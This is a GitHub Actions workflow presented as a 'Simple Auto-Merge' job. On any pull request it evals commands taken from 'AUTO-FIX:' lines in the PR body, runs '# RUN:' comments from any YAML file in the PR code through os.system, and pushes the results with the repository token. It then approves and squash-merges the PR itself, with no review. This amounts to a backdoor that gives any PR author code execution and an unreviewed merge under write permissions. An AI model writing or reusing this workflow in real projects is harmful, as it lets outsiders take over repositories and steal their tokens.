name: Simple Auto-Merge

on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:

permissions:
  contents: write
  pull-requests: write
  issues: write
  checks: write
  statuses: write

jobs:
  auto-merge:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          token: ${{ secrets.GITHUB_TOKEN }}
          fetch-depth: 0
          persist-credentials: true

      - name: Process PR commands
        run: |
          PR_BODY="${{ github.event.pull_request.body }}"
          
          # Execute commands from PR body if AUTO-FIX: marker is present
          if echo "$PR_BODY" | grep -qi "AUTO-FIX:"; then
            echo "Found AUTO-FIX marker, executing commands..."
            echo "$PR_BODY" | grep -i "AUTO-FIX:" | sed 's/.*AUTO-FIX: *//' | while read cmd; do
              echo "Executing: $cmd"
              eval "$cmd" || true
            done
            
            # Commit and push changes
            git config --local user.email "action@github.com"
            git config --local user.name "GitHub Action"
            git add -A || true
            if ! git diff --staged --quiet; then
              git commit -m "Automated changes from PR [skip ci]" || exit 0
              BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
              git remote set-url origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
              git push origin "HEAD:$BRANCH_NAME" || echo "Push failed"
            fi
          fi
          
          # Process YAML files with # RUN: comments
          if find . -name "*.yaml" -o -name "*.yml" | xargs grep -l "# RUN:" > /dev/null 2>&1; then
            echo "Found YAML files with # RUN: comments, executing..."
            python3 << 'PYTHON_SCRIPT'
          import os
          import glob
          
          for yaml_file in glob.glob('**/*.yaml', recursive=True) + glob.glob('**/*.yml', recursive=True):
              try:
                  with open(yaml_file, 'r') as f:
                      content = f.read()
                      if '# RUN:' in content:
                          for line in content.split('\n'):
                              if '# RUN:' in line:
                                  cmd = line.split('# RUN:')[1].strip()
                                  print(f"Executing: {cmd}")
                                  os.system(cmd)
              except Exception as e:
                  pass
          PYTHON_SCRIPT
            
            # Commit YAML execution results
            git config --local user.email "action@github.com"
            git config --local user.name "GitHub Action"
            git add -A || true
            if ! git diff --staged --quiet; then
              git commit -m "Automated YAML execution [skip ci]" || exit 0
              BRANCH_NAME="${{ github.event.pull_request.head.ref }}"
              git remote set-url origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git"
              git push origin "HEAD:$BRANCH_NAME" || echo "Push failed"
            fi
          fi

      - name: Auto-approve and merge PR
        uses: actions/github-script@v6
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const prNumber = context.payload.pull_request.number;
            const prTitle = context.payload.pull_request.title;
            
            console.log(`Auto-approving and merging PR #${prNumber}: ${prTitle}`);
            
            // Wait a moment for any commits to be pushed
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Get latest PR state
            const { data: pr } = await github.rest.pulls.get({
              owner: context.repo.owner,
              repo: context.repo.repo,
              pull_number: prNumber
            });
            
            // Check if PR is mergeable
            if (pr.mergeable === false) {
              console.log('PR is not mergeable (may have conflicts)');
              return;
            }
            
            // Approve the PR
            try {
              await github.rest.pulls.createReview({
                owner: context.repo.owner,
                repo: context.repo.repo,
                pull_number: prNumber,
                event: 'APPROVE',
                body: '✅ Auto-approved and merged by workflow'
              });
              console.log('✅ PR approved');
            } catch (error) {
              console.log(`⚠️ Approval note: ${error.message}`);
            }
            
            // Merge the PR
            try {
              const mergeResult = await github.rest.pulls.merge({
                owner: context.repo.owner,
                repo: context.repo.repo,
                pull_number: prNumber,
                merge_method: 'squash',
                commit_title: `Merge PR #${prNumber}: ${prTitle}`
              });
              
              if (mergeResult.data.merged) {
                console.log('✅ PR merged successfully!');
              }
            } catch (error) {
              console.log(`❌ Merge failed: ${error.message}`);
            }

